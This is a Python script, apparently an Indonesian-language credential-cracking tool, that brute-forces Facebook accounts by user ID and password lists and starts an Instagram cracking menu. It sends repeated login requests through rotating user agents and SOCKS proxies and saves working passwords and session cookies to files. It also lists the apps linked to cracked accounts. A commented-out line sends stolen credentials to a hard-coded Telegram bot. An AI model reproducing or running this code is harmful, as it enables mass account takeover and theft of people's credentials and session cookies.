	ua_crack = ["Mozilla/5.0 (Linux; Android 10; RMX2185) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; TECNO CG6j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; Redmi Note 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; SM-J730F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; RMX3085 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/378.0.0.18.112;]","Mozilla/5.0 (Mobile; LYF/F320B/LYF-F320B-002-02-56-250322;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.3.2","Mozilla/5.0 (Mobile; LYF/F320B/LYF-F320B-002-02-56-250322;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.3.2","Mozilla/5.0 (Mobile; Qmobile_4Gplus; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.1.2","Mozilla/5.0 (Mobile; Tech_Pad_Kaios_One_3G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.1.1","Mozilla/5.0 (X11; CrOS armv7l 13597.84.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.187 Safari/537.36 Mozilla/5.0 (Mobile; Nokia 8000 4G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.4","Mozilla/5.0 (Mobile; Nokia_800_Tough; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.2.2","Mozilla/5.0 (Mobile; LYF/F300B/LYF-F300B-001-01-15-130718-i;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5 Edg/93.0.4577.63","Mozilla/5.0 (Mobile; LYF/F220B/LYF-F220B-003-01-45-051119;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5","Mozilla/5.0 (Mobile; LOGIC_LOGIC_B8K_3G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.1.2","Mozilla/5.0 (Linux; rv:48.0; U; US) Gecko/48.0 Firefox/48.0 KAIOS/2.5","Mozilla/5.0 (Mobile; LYF/F220B/LYF-F220B-003-01-50-091120;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5","Mozilla/5.0 (Mobile; Digit_Digit4G_4G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.2.2","Mozilla/5.0 (Mobile; rv:37.0; 4044V) Gecko/68.0 Firefox/101.0 KaiOS/1.0"]
	ua = random.choice(ua_crack)
	ses = requests.Session()
	c_pw = len(pwr)
	runc= random.choice([K,M,U,O,B,H])
	prog.update(des,description=f'\r[deep_white]{(HikmatXD)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	sys.stdout.flush()
	c_pw -=1
	for pw in pwr:
		pw = pw.lower()
		try:
			proxff= open('proxy_mat.txt','r').read().splitlines()
			cuukk=random.choice(proxff)
			proxs= {'http': 'socks5://'+cuukk}
			ses.headers.update({'Host': link_okep,'cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get(f'https://{link_okep}/login/device-based/password/?uid={uiz}&flow=login_no_pin&next=https%3A%2F%2F{link_okep}%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":uiz,"next":"https://"+link_okep+"/v7.0/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': link_okep,'cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': link_okep,'content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://'+link_okep+'/login/device-based/password/?uid='+uiz+'&flow=login_no_pin&next=https%3A%2F%2F'+link_okep+'%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post(f'https://m.facebook.com/login.php?skip_api_login=1&api_key=2572246932852997&kid_directed_site=0&app_id=2572246932852997&signed_next=1&next=https%3A%2F%2Fmobile.facebook.com%2Fv4.0%2Fdialog%2Foauth%3Fapp_id%3D2572246932852997%26cbt%3D1661534602987%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df25d34c28ae3b%2526domain%253Dmyim3app.indosatooredoo.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fmyim3app.indosatooredoo.com%25252Ff34e52cf14f2a7%2526relation%253Dopener%26client_id%3D2572246932852997%26display%3Dtouch%26domain%3Dmyim3app.indosatooredoo.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fmyim3app.indosatooredoo.com%252F%2523%252Flogin%26fields%3Dname%252Cemail%252Cpicture%252Cfirst_name%252Clast_name%26locale%3Den_US%26logger_id%3Df2ff9ffc40133c%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df281ffe569918fc%2526domain%253Dmyim3app.indosatooredoo.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fmyim3app.indosatooredoo.com%25252Ff34e52cf14f2a7%2526relation%253Dopener%2526frame%253Df3d736470e0e11c%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%252Cpublic_profile%26sdk%3Djoey%26version%3Dv4.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df281ffe569918fc%26domain%3Dmyim3app.indosatooredoo.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fmyim3app.indosatooredoo.com%252Ff34e52cf14f2a7%26relation%3Dopener%26frame%3Df3d736470e0e11c%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdc=1&_rdr')
			if "checkpoint" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"}
				tree = Tree("")
				print(f'%s• %s• %sstatus crack  %s: %ssesi%s-%s'%(M,H,K,P,K,P,sekarang))
				tree.add("%suid pengguna  : %s%s"%(P,H,uiz))
				tree.add("%suid password  : %s%s"%(P,H,pw))
				tree.add("%stahun akun id : %s"%(P,tahun(uiz)))
				tree.add("%s%s\n"%(K,ua))
				cetak(tree)
#				requests.post(f"https://api.telegram.org/bot5539469352:AAFrb2CQ8j7csc49E2TtFpZxo_b3nCo3R00/sendMessage?chat_id=5039055476&text={uiz} <-> {pw}")
#				print("\r %s*--> %s|%s %s• %s "%(K,uiz,pw,warna_warni_biasa,tahun(uiz)))
				open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"Mozilla/5.0 (Mobile; Nokia_800_Tough; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.2.2"}
				if "no" in tampilkan_apk:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					tree = Tree("")
					print('%s• %s• %sstatus crack %s: %slive%s-%s'%(B,K,H,P,H,P,sekarang))
					tree.add("%suid pengguna  : %s%s"%(P,H,uiz))
					tree.add("%suid password  : %s%s"%(P,H,pw))
					tree.add("%stahun akun id : %s"%(P,tahun(uiz)))
					tree.add("%s%s"%(H,kuki))
					tree.add("%s%s\n"%(K,ua))
					cetak(tree)
#					print("\r %s*--> %s|%s %s• %s "%(H,uiz,pw,warna_warni_biasa,tahun(uiz)))
#					print("\r %s*--> %s "%(H,kuki))
					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
					ok+=1
					break
				elif "ya" in tampilkan_apk:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					tree = Tree("")
					print('%s• %s• %sstatus crack %s: %slive%s-%s'%(B,K,H,P,H,P,sekarang))
					tree.add("%suid pengguna  : %s%s"%(P,H,uiz))
					tree.add("%suid password  : %s%s"%(P,H,pw))
					tree.add("%stahun akun id : %s"%(P,tahun(uiz)))
					tree.add("%s%s"%(H,kuki))
					tree.add("%s%s\n"%(K,ua))
					cetak(tree)
#					print("\r %s*--> %s|%s %s• %s "%(H,uiz,pw,warna_warni_biasa,tahun(uiz)))
#					print("\r %s*--> %s "%(H,kuki))
					cek_apk(ses,kuki)
					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
					ok+=1
					break
					
			else:
				continue
		except requests.exceptions.ConnectionError:
			turu(31)
	HikmatXD+=1

def api(uiz,pwr):
	global ok,cp,HikmatXD
	ua_crack = ["Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Focus/1.0 Chrome/59.0.3029.83 Mobile Safari/537.36","Mozilla/5.0 (X11; Linux armv6l) EkiohFlow/5.13.4.34727M Flow/5.13.4 (like Gecko Firefox/62.0 rv:62.0)","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Silk/102.2.1 like Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.101 Safari/537.36 OPR/40.0.2308.62","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36 PTST/220727.141334","Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.8.0.8) Gecko/20061025 Firefox/1.5.0.8","Links (2.20.2; Linux 5.4.0-100-generic x86_64; GNU C 9.2.1; text)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (Linux; x86_64 GNU/Linux) AppleWebKit/601.1 (KHTML, like Gecko) Version/8.0 Safari/601.1 WPE comcast/ipstb (comcast, 1.0.0.0)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.022","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.0","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3440.106 Safari/537.36 SmartTV/9.0 Crow/1.0"]
	ua = random.choice(ua_crack)
	ses = requests.Session()
	c_pw = len(pwr)
	runc= random.choice([K,M,U,O,B,H]) 
	sys.stdout.write("\r %s• %scracked %s%s/%s/%s %sok:%s %scp:%s "%(P,runc,P,str(c_pw),len(id2 or id4),HikmatXD,H,ok,K,cp)); sys.stdout.flush()
	c_pw -=1
	for pw in pwr:
		pw = pw.lower()
		proxff= open('proxy_mat.txt','r').read().splitlines()
		cuukk=random.choice(proxff)
		proxs= {'http': 'socks5://'+cuukk}
		headers = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT","x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA","user-agent": ua, "content-type": "application/x-www-form-urlencoded","x-fb-http-engine": "Liger"}
		response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uiz)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers,proxies=proxs) 
		if "session_key" in response.text and "EAAG" in response.text:
			print("\r %s*--> %s|%s %s• %s"%(H,uiz,pw,warna_warni_biasa,tahun(uiz)))
			open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+'\n')
			ok+=1
			break
		elif "www.facebook.com" in response.json()["error_msg"]:
			print("\r %s*--> %s|%s %s• %s"%(K,uiz,pw,warna_warni_biasa,tahun(uiz)))
			open('CP/'+cpz,'a').write(uiz+'|'+pw+'|'+'\n')
			cp+=1
			break
		else:
			continue
	
	HikmatXD +=1


def opsi_detect(uiz,pw):
	global cp
	ua = ["Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Focus/1.0 Chrome/59.0.3029.83 Mobile Safari/537.36","Mozilla/5.0 (X11; Linux armv6l) EkiohFlow/5.13.4.34727M Flow/5.13.4 (like Gecko Firefox/62.0 rv:62.0)","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Silk/102.2.1 like Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.101 Safari/537.36 OPR/40.0.2308.62","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36 PTST/220727.141334","Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.8.0.8) Gecko/20061025 Firefox/1.5.0.8","Links (2.20.2; Linux 5.4.0-100-generic x86_64; GNU C 9.2.1; text)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (Linux; x86_64 GNU/Linux) AppleWebKit/601.1 (KHTML, like Gecko) Version/8.0 Safari/601.1 WPE comcast/ipstb (comcast, 1.0.0.0)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.022","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.0","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3440.106 Safari/537.36 SmartTV/9.0 Crow/1.0"]
	head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
	ses = requests.Session()
	from bs4 import BeautifulSoup as sop
	try:
		hi = ses.get('https://mbasic.facebook.com')
		ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':uiz,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
		jo = ho.find('form')
		data = {}
		lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
		for anj in jo('input'):
			if anj.get('name') in lion:
				data.update({anj.get('name'):anj.get('value')})
		kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
		print("\r %s*--> %s|%s • %s"%(K,uiz,pw,tahun(uiz)))
		open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
		cp+=1
		opsi = kent.find_all('option')
		if len(opsi)==0:
			print(garis+H+" tap yes/a2f.. cek lagi akunnya login di fb lite ")
		else:
			for opsii in opsi:
				print('\r'+garis+'%s terdapat %s%s '%(P,K,opsii.text))
	except Exception as c:
		print("\r %s*--> %s|%s • %s"%(K,uiz,pw,tahun(uiz)))
		print('\r'+garis+'%s tidak dapat mengecek opsi... cek login di fb lite/mbasic '%(M))
		open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
		cp+=1
		
def cek_apk(ses,kuki):
	w=ses.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":kuki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print('\r'+garis+M+' tidak ada apk aktif yang terkait ')
	else:
		print('\r'+garis+H+' aplikasi yang terkait : ')
		for i in range(len(game)):
			print("\r"+garis+" %s%s. %s%s"%(P,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),P))

	w=ses.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":kuki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print('\r'+garis+M+' tidak ada apk kadaluarsa yang terkait ')
	else:
		print('\r'+garis+K+' aplikasi kadaluarsa yang terkait : ')
		for i in range(len(game)):
			print("\r"+garis+" %s%s. %s%s"%(P,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),P))
		else:
			print('\r') 

################## [ INSTAGRAM MENU ] ##################
try:
    import json
    import uuid
    import hmac
    import random
    import hashlib
    import urllib
    import stdiomask
    import urllib.request
    import calendar
except ImportError as e:
    exit(f'\n [\033[1;35m>\033[0m] module {e} belum terinstall')
import requests,bs4,json,os,sys,random,datetime,time,re
try:
    import rich
except ImportError:
    os.system('pip install rich')
    time.sleep(1)
    try:
        import rich
    except ImportError:
        exit('Tidak Dapat Menginstall Module rich, Coba Install Manual (pip install rich)')
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from time import sleep
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from bs4 import BeautifulSoup as parser
import time
day=datetime.now().strftime("%d-%b-%Y")
nyMnD = 5
nyMxD = 10
current_GMT = time.gmtime(time.time())
insta_log='https://www.instagram.com/accounts/login/?force_classic_login=&'
url='https://www.instagram.com'
menudump=[]
try:
    os.mkdir('result')
except:
    pass
    
try:
    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    print('GAGAL')
    
prox=open('.prox.txt','r').read().splitlines()
BN='\x1b[1;107m' # BELAKANG PUTIH
BBL='\x1b[1;106m' # BELAKANG BIRU LANGIT
BP='\x1b[1;105m' # BELAKANG PINK
BB='\x1b[1;104m' # BELAKANG BIRU
BK='\x1b[1;103m' # BELAKANG KUNING
BH='\x1b[1;102m' # BELAKANG HIJAU
BM='\x1b[1;101m' # BELAJANG MERAH
BA='\x1b[1;100m' # BELAKANG ABU ABU
B='\x1b[1;97m' # BIRU
L='\x1b[1;93m'
V='\x1b[1;957m'
N='\x1b[0m'    # WARNA MATI
CY='\033[96;1m'
Z='\x1b[1;92m' #HIJAU TUA
H='\033[1;32m' #HIJAU
M='\033[1;31m' #MERAH
K='\033[1;33m' #KUNING
U='\033[1;35m' #UNGU
O='\033[38;2;255;127;0;1m' #ORANGE
C='\033[0m' #CLEAR
N = '\x1b[0m' # WARNA MATI
USN="Mozilla/5.0 (iPhone; CPU iPhone OS 15_0_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 213.1.0.22.117 (iPhone13,2; iOS 15_0_2; en_US; en-US; scale=3.00; 1170x2532; 332048479)"
# USN="Mozilla/5.0 (Linux; U; Android 2.3.8; sv-se; Huawei Social Phone Build/HWIX3) AppleWebKit/533.1 (KHTML, like Gecko) Dolphin/10.1.1005.22 Mobile Safari/533.1"
ugen=open('ua.txt','r').read().splitlines()
internal,external,success,checkpoint,loop,following,lisensikuni,lisensiku=[],[],[],[],0,[],[],['sukses']
s=requests.Session()

def loading():
    animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(f"\r└── {C}Sedang Mengumpulkan{K} ID{H} " + animation[i % len(animation)] +"\x1b[0m")
        sys.stdout.flush()
# CLEAR
#def clear():
#    os.system('clear')
 
# BANNER
def banner123():
    clear()
    print("""\x1b[0m╭────────────────────────────────────────────────────────────────────╮
│\033[1;32m ____  __  __    _    ____ _____      ____ ____      _    ____ _  __\x1b[0m│
│\033[1;32m\x1b[1;100m/ ___||  \/  |  / \  |  _ \_   _|    / ___|  _ \    / \  / ___| |/ /\x1b[0m│
│\033[1;32m\x1b[1;100m\___ \| |\/| | / _ \ | |_) || |_____| |   | |_) |  / _ \| |   | ' /\x1b[0m │
│\033[1;32m\x1b[1;100m ___) | |  | |/ ___ \|  _ < | |_____| |___|  _ <  / ___ \ |___| . \ \x1b[0m│
│\033[1;32m\x1b[1;100m|____/|_|  |_/_/   \_\_| \_\|_|      \____|_| \_\/_/   \_\____|_|\_\│\x1b[0m
│								    \x1b[0m │
╰────────────────────────────────────────────────────────────────────╯""")
try:
    # python 2
    urllib_quote_plus = urllib.quote
except:
    # python 3
    urllib_quote_plus = urllib.parse.quote_plus
 


def cekAPI(cookie):
    user=open('.username','r').read()
    try:
        c=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),cookies={'cookie':cookie},headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
        i=c.json()["data"]["user"]
        nama=i["full_name"]
        followers=i["edge_followed_by"]["count"]
        following=i["edge_follow"]["count"]
        external.append(f'{nama}|{followers}|{following}')
    except  (ValueError,KeyError):
        wel='# Instagram Checkpoint'
        wel2 = mark(wel, style='red')
        sol().print(wel2)
        time.sleep(4)
        os.remove('.kukis.log')
        os.remove('.username')
        exit()

    return external,user

def login_kamu():
    if "sukses" in lisensiku:
        try:
            kuki=open('.kukis.log','r').read()
        except FileNotFoundError:
            banner()
            wel = '# Pilih Cara Kamu Login'
            wel2 = mark(wel, style='magenta')
            sol().print(wel2)
            io = '[1] Akses Masuk Memerlukan Cookie Extensions Cookiedough'
            oi = nel(io, style='cyan')
            cetak(nel(oi, title='AKSES LOGIN'))
            loginpil=input(f"[+] Pilih :{C} ")
            if loginpil=='1':
                wel = '# Gunakan username dan cookies instagram untuk login. sebelum login pastikan akun bersifat publik bukan privat'
                wel2 = mark(wel, style='red')
                sol().print(wel2)
                us=input(f'{CY}[•] Masukan Username :{C}')
